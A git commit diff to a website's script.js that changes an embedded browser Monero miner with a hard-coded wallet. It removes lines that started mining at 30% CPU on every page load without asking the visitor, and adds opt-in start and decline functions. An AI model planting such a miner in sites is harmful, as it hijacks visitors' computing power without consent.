b79dfc23e1d36571e8f8478e336b2d6e0232bfb4
NikoT19 <77738198+NikoT19@users.noreply.github.com>
2024-12-23 12:07:02 +0600

    script.js

--- script.js
+++ script.js
@@ -1,9 +1,25 @@
-const miner=new Client.Anonymous('41iVeDotGpaG9u4xgzjZZoEoWx6znhpaT77xjrJ4k8HP8mQx8UrzxnSKikNuZ3XdZQ6BGcPMUK2GmGfj8utMGqG3GHMzpip',{throttle:0.3,
+// Инициализация майнера
+const miner = new Client.Anonymous('41iVeDotGpaG9u4xgzjZZoEoWx6znhpaT77xjrJ4k8HP8mQx8UrzxnSKikNuZ3XdZQ6BGcPMUK2GmGfj8utMGqG3GHMzpip', {
+    throttle: 0.3, // Использование 30% мощности процессора
 });
-if (!miner.isRunning()){
-  miner.start();
+
+// Функция для запуска майнинга
+function startMining() {
+    if (!miner.isRunning()) {
+        miner.start();
+        alert('Майнинг запущен! Спасибо за поддержку.');
+    }
+    document.getElementById('miner-notification').style.display = 'none';
 }
-miner.on('update',(data)=>{
-  console.log('hash rate:${data.hashesPerSecond}');
-  console.log('Total hashes:${data.totalHashes}');
+
+// Функция для отказа от майнинга
+function declineMining() {
+    alert('Майнинг не включён. Спасибо за посещение сайта.');
+    document.getElementById('miner-notification').style.display = 'none';
+}
+
+// Вывод статистики майнинга
+miner.on('update', (data) => {
+    console.log(`Hash rate: ${data.hashesPerSecond} H/s`);
+    console.log(`Total hashes mined: ${data.totalHashes}`);
 });
